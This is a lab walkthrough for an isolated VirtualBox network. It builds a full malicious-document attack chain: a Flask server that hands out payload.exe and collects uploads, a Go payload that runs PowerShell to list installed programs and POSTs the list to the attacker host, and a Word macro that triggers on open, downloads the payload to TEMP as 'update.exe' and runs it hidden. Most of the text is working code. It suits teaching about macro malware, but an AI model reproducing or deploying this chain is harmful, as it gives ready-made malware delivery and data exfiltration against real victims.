# Labor 5
## Environment Setup
### VirtualBox Network Configuration
1. Create internal network for VMs
    - Settings -> Network
    - Select "Internal Network"
    - Name: "isolatedlab"
    - Repeat for both VMs

2. Configure Static IPs
    - Kali: 192.168.1.10
    - Windows: 192.168.1.20

### Windows Setup
1. Mount OFFICE_2010.iso in VirtualBox settings
2. Install Office 2010 from mounted ISO

## Server Setup (Kali)

### Flask Server
Create `server.py`:
```python
from flask import Flask, request, send_file

app = Flask(__name__)

@app.route('/payload.exe', methods=['GET'])
def serve_payload():
    return send_file('payload.exe', as_attachment=True)

@app.route('/data', methods=['POST'])
def receive_data():
    data = request.get_data()
    print("Received data:")
    print(data.decode('utf-8'))
    
    with open('received_programs.txt', 'wb') as f:
        f.write(data)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
```

Start server:
```bash
python3 server.py
```

## Payload Creation

Create `main.go`:
```go
package main

import (
    "bytes"
    "log"
    "net/http"
    "os/exec"
)

func getPrograms() string {
    cmd := exec.Command("powershell", "-command", "Get-Package | Select-Object Name, Version, ProviderName")
    output, err := cmd.Output()
    if err != nil {
        log.Printf("Error executing PowerShell: %v", err)
        return "Error getting programs"
    }
    return string(output)
}

func sendData(data string) error {
    resp, err := http.Post("http://192.168.1.10:8080/data", "text/plain", bytes.NewBuffer([]byte(data)))
    if err != nil {
        log.Printf("HTTP error: %v", err)
        return err
    }
    defer resp.Body.Close()
    log.Printf("Server response status: %d", resp.StatusCode)
    return nil
}

func main() {
    programs := getPrograms()
    err := sendData(programs)
    if err != nil {
        log.Printf("Failed to send data: %v", err)
    }
}
```

Compile on Kali:
```bash
mkdir winpayload
cd winpayload
go mod init winpayload
# Copy main.go into directory
GOOS=windows GOARCH=amd64 go build -o ../payload.exe
```

### Word Macro
Create new Word document and add this macro (Alt+F11):
```vb
Sub AutoOpen()
    DownloadAndExecute
End Sub

Sub Document_Open()
    DownloadAndExecute
End Sub

Sub DownloadAndExecute()
    Dim xhr As Object
    Dim filePath As String
    
    ' Create temp file path
    filePath = Environ("TEMP") & "\update.exe"
    
    ' Download file
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", "http://192.168.1.10:8080/payload.exe", False
    xhr.send
    
    If xhr.Status = 200 Then
        ' Save binary data
        Dim stream As Object
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1  'Binary'
        stream.Write xhr.responseBody
        stream.SaveToFile filePath, 2  'Overwrite'
        stream.Close
        
        ' Execute
        CreateObject("WScript.Shell").Run filePath, 0, True
    End If
End Sub
```
Save as .docm with macros enabled.

## Testing
1. Start Flask server on Kali
2. Test payload download: `http://192.168.1.10:8080/payload.exe`
3. Open Word document on Windows
4. Check received data in `received_programs.txt` on Kali

## Notes
- All systems isolated in internal network
- No internet access for security
- Flask server handles both payload distribution and data collection
- Payload collects installed programs list as demo functionality